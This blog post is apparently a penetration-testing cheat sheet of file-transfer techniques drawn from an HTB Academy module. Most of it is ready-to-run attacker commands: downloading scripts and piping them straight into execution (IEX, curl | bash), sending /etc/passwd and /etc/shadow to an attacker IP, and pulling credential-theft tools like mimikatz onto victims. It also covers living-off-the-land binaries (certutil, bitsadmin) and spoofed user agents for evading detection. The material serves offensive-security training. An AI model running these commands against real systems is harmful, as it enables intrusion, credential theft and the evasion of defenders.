---
layout: post
title:  File transfers
description: How to transfer a file to your target
date:   2018-04-21 15:01:35 +0300
image:  'https://academy.hackthebox.com/storage/modules/24/logo.png'
cheats: true
featured: true
toc: true
tags:   [cheatsheet, cpts, oscp, osce]
---


# Download Operations

## PowerShell Base64 Encode & Decode

`XeroCyb3r@htb[/htb] md5sum id_rsa`

`XeroCyb3r@htb[/htb] cat id_rsa |base64 -w 0;echo`

`PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64>"))`

Finally, we can confirm if the file was transferred successfully using the [Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2) cmdlet, which does the same thing that `md5sum` does.

`PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5`

## **PowerShell Web Downloads**

| Method | Description |
| --- | --- |
| https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0 | Returns the data from a resource as a https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0. |
| https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0 | Returns the data from a resource without blocking the calling thread. |
| https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0 | Downloads data from a resource and returns a Byte array. |
| https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0 | Downloads data from a resource and returns a Byte array without blocking the calling thread. |
| https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0 | Downloads data from a resource to a local file. |
| https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0 | Downloads data from a resource to a local file without blocking the calling thread. |
| https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0 | Downloads a String from a resource and returns a String. |
| https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0 | Downloads a String from a resource without blocking the calling thread. |

`PS C:\htb> (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')`

`PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')`

PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.

`PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')`

`IEX` also accepts pipeline input.

`PS C:\htb> (New-Object Net.WebClient).DownloadString('<Target File URL>') | IEX`

From PowerShell 3.0 onwards, the [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.

`PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1`

<aside>
💡 Harmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239).

</aside>

There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.

This can be bypassed using the parameter `-UseBasicParsing`.

`PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX`

**Certificate not trusted error**

`PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('<Target File URL>')`

## **SMB Downloads**

`XeroCyb3r@htb[/htb] sudo impacket-smbserver share -smb2support /tmp/smbshare`

`C:\htb> copy \\192.168.220.133\share\nc.exe`

With a username & password

`XeroCyb3r@htb[/htb] sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`

`C:\htb> net use n: \\192.168.220.133\share /user:test test`

## **FTP Downloads**

`XeroCyb3r@htb[/htb] sudo pip3 install pyftpdlib`

`XeroCyb3r@htb[/htb] sudo python3 -m pyftpdlib --port 21`

`PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')`

When we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.

**Create a Command File for the FTP Client and Download the Target File**

`C:\htb> ftp -v -n -s:ftpcommand.txt`

# Upload Operations

`PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))`

`PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash`

`XeroCyb3r@htb[/htb] echo <Base64 hash> | base64 -d > hosts`

`XeroCyb3r@htb[/htb] md5sum hosts`

## PowerShell Web Uploads

PowerShell doesn't have a built-in function for upload operations, but we can use `Invoke-WebRequest` or `Invoke-RestMethod` to build our upload function.

`XeroCyb3r@htb[/htb] pip3 install uploadserver`

`XeroCyb3r@htb[/htb] python3 -m uploadserver`

Now we can use a PowerShell script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-WebRequest` to perform the upload operations.

The script accepts two parameters `-File`, which we use to specify the file path, and `-Uri`, the server URL where we'll upload our file.

`PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts`

## PowerShell Base64 Web Upload

`PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))`

`PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64`

`XeroCyb3r@htb[/htb] nc -lvnp 8000`

`XeroCyb3r@htb[/htb] echo <base64> | base64 -d -w 0 > hosts`

## SMB Uploads

An alternative is to run SMB over HTTP with `WebDav`. `WebDAV` [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The `WebDAV` protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. `WebDAV` can also use HTTPS.

In the following Wireshark capture, we attempt to connect to the file share `testing3`, and because it didn't find anything with `SMB`, it uses `HTTP`.

To set up our WebDav server, we need to install two Python modules, `wsgidav` and `cheroot` (you can read more about this implementation here: [wsgidav github](https://github.com/mar10/wsgidav)).

`XeroCyb3r@htb[/htb] sudo pip install wsgidav cheroot`

`XeroCyb3r@htb[/htb] sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`

`C:\htb> dir \\192.168.49.128\DavWWWRoot`

`C:\htb> copy <file path> \\192.168.49.129\DavWWWRoot\`

## FTP Uploads

`XeroCyb3r@htb[/htb] sudo python3 -m pyftpdlib --port 21 --write`

`PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`

`C:\htb> ftp -v -n -s:ftpcommand.txt`

# Linux File Transfer Methods

# Download Operations

## **Base64 Encoding / Decoding**

**Attacker**

`[!bash!] md5sum id_rsa`

`[!bash!] cat id_rsa |base64 -w 0;echo`

**Victim**

`[!bash!] echo -n '<base64>' | base64 -d > id_rsa`

`[!bash!] md5sum id_rsa`

## **Web Downloads with Wget and cURL**

`[!bash!] wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`

`[!bash!] curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`

## **Fileless Attacks Using Linux**

`[!bash!] curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`

`[!bash!] wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3`

## **Download with Bash (/dev/tcp)**

`[!bash!] exec 3<>/dev/tcp/10.10.10.32/80`

`[!bash!] echo -e "GET /LinEnum.sh HTTP/1.1\n\n">**&3**`

`[!bash!] cat <&3`

## **SSH Downloads**

`SCP` (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.

`SCP` is very similar to `copy` or `cp`, but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.

Attacker

`[!bash!] sudo systemctl enable ssh`

`[!bash!] sudo systemctl start ssh`

`[!bash!] netstat -lnpt`

**Victim**

`[!bash!] scp plaintext@192.168.49.128:/root/myroot.txt .`

# **Upload Operations**

## **Web Upload**

Attacker

`[!bash!] sudo python3 -m pip install --user uploadserver`

`[!bash!] openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`

`[!bash!] mkdir https && cd https`

`[!bash!] sudo python3 -m uploadserver 443 --server-certificate /root/server.pem`

Victim

`[!bash!] curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure`

## **Alternative Web File Transfer Method**

Attacker

`[!bash!] python3 -m http.server`

**OR**

`[!bash!] python2.7 -m SimpleHTTPServer`

`[!bash!] php -S 0.0.0.0:8000`

`[!bash!] ruby -run -ehttpd . -p8000`

Victim

`[!bash!] wget 192.168.49.128:8000/filetotransfer.txt`

## SCP UPLOAD

`[!bash!] scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/`

# **Transfering Files with Code**

`XeroCyb3r@htb[/htb] python2.7 -c 'import urllib;urllib.urlretrieve ("<Target File Url>", "LinEnum.sh")'`

`XeroCyb3r@htb[/htb] python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`

`XeroCyb3r@htb[/htb] php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`

`XeroCyb3r@htb[/htb] php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'`

`XeroCyb3r@htb[/htb] php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash`

`XeroCyb3r@htb[/htb] ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'`

`XeroCyb3r@htb[/htb] perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'`

### JavaScript

{% highlight jsx %}
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
{% endhighlight %}

- Save to **wget.js**

`C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1`

### VBScript

[VBScript](https://en.wikipedia.org/wiki/VBScript) ("Microsoft Visual Basic Scripting Edition") is an Active Scripting language developed by Microsoft that is modeled on Visual Basic. VBScript has been installed by default in every desktop release of Microsoft Windows since Windows 98.

{% highlight jsx %}
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
{% endhighlight %}

- Save to wget.vbs

`C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1`

## Upload Operations using Python3

`XeroCyb3r@htb[/htb] python3 -m uploadserver`

`XeroCyb3r@htb[/htb] python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'`

# Miscellaneous File Transfer Methods

[Netcat](https://sectools.org/tool/netcat/) (often abbreviated to `nc`) is a computer networking utility for reading from and writing to network connections using TCP or UDP, which means that we can use it for file transfer operations.

## Netcat

**Compromised:** `victim@target:~ nc -l -p 8000 > SharpKatz.exe`

`XeroCyb3r@htb[/htb] nc -q 0 192.168.49.128 8000 < SharpKatz.exe`

**Sending File as Input**

`XeroCyb3r@htb[/htb] sudo nc -l -p 443 -q 0 < SharpKatz.exe`

`victim@target:~ nc 192.168.49.128 443 > SharpKatz.exe`

OR

`victim@target:~ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe`

## Ncat

Compromised: `victim@target:~ ncat -l -p 8000 --recv-only > SharpKatz.exe`

`XeroCyb3r@htb[/htb] ncat --send-only 192.168.49.128 8000 < SharpKatz.exe`

**Sending File as Input**

`XeroCyb3r@htb[/htb] sudo ncat -l -p 443 --send-only < SharpKatz.exe`

`victim@target:~ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe`

**OR**

`victim@target:~ cat < /dev/tcp/192.168.49.128/443 > <filename>`

# PowerShell Session File Transfer

By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration.

### From DC01

`PS C:\htb> whoami`

`PS C:\htb> hostname`

`PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985`

`PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01`

Copy samplefile.txt from our Localhost to the DATABASE01 Session

`PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\`

Copy DATABASE.txt from DATABASE01 Session to our Localhost

`PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session`

# RDP

RDP (Remote Desktop Protocol) is commonly used in Windows networks for remote access.

`XeroCyb3r@htb[/htb] rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'`

`XeroCyb3r@htb[/htb] xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer`

To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.

Alternatively, from Windows, the native [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) remote desktop client can be used.

# Protected File Transfers

Many different methods can be used to encrypt files and information on Windows systems. One of the simplest methods is the [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1) PowerShell script. This script is small and provides encryption of files and strings.

`PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1`

`PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt`

[OpenSSL](https://www.openssl.org/) is frequently included in Linux distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style" to encrypt files

`XeroCyb3r@htb[/htb] openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc`

`XeroCyb3r@htb[/htb] openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd`

# Catching Files over HTTP/S

### Nginx - Enabling PUT

`XeroCyb3r@htb[/htb] sudo mkdir -p /var/www/uploads/SecretUploadDirectory`

`XeroCyb3r@htb[/htb] sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory`

Create the Nginx configuration file by creating the file `/etc/nginx/sites-available/upload.conf` with the contents

{% highlight jsx %}
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
{% endhighlight %}

`XeroCyb3r@htb[/htb] sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/`

`XeroCyb3r@htb[/htb] sudo systemctl restart nginx.service`

## Verifying errors

`XeroCyb3r@htb[/htb] tail -2 `/var/log/nginx/error.log``

`XeroCyb3r@htb[/htb] ss -lnpt | grep `80``

`XeroCyb3r@htb[/htb] ps -ef | grep `2811``

**Remove Nginx Config**

`XeroCyb3r@htb[/htb] sudo rm /etc/nginx/sites-enabled/default`

**Testing**

`XeroCyb3r@htb[/htb] curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt`

`XeroCyb3r@htb[/htb] tail -1 /var/www/uploads/SecretUploadDirectory/users.txt`

# Living off The Land

The term LOLBins (Living off the Land binaries) came from a Twitter discussion on what to call binaries that an attacker can use to perform actions beyond their original purpose.

- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)

Living off the Land binaries can be used to perform functions such as:

- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses

Upload win.ini to our Pwnbox

`C:\htb> certreq.exe -Post -config http://192.168.49.128/ c:\windows\win.ini`

`XeroCyb3r@htb[/htb] sudo nc -lvnp 80`

`XeroCyb3r@htb[/htb] openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem`

`XeroCyb3r@htb[/htb] openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh`

`XeroCyb3r@htb[/htb] openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh`

`PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe`

`PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Windows\Temp\nc.exe"`

`C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`

# Detection

Command-line detection based on blacklisting is straightforward to bypass, even using simple case obfuscation.

Most client-server protocols require the client and server to negotiate how content will be delivered before exchanging information. This is common with the `HTTP` protocol. There is a need for interoperability amongst different web servers and web browser types to ensure that users have the same experience no matter their browser. HTTP clients are most readily recognized by their user agent string, which the server uses to identify which `HTTP` client is connecting to it, for example, Firefox, Chrome, etc.

User agents are not only used to identify web browsers, but anything acting as an `HTTP` client and connecting to a web server via `HTTP` can have a user agent string (i.e., `cURL`, a custom `Python` script, or common tools such as `sqlmap`, or `Nmap`)

This [website](http://useragentstring.com/index.php) is handy for identifying common user agent strings. A list of user agent strings is available [here](http://useragentstring.com/pages/useragentstring.php).

# Evading Detection

If diligent administrators or defenders have blacklisted any of these User Agents, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contains a UserAgent parameter, which allows for changing the default user agent to one emulating Internet Explorer, Firefox, Chrome, Opera, or Safari.

`PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl`

`PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome`

`PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"`

### LOLBAS / GTFOBins

Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence. In this case, an option may be to use a "LOLBIN" (living off the land binary), alternatively also known as "misplaced trust binaries.”

`PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"`
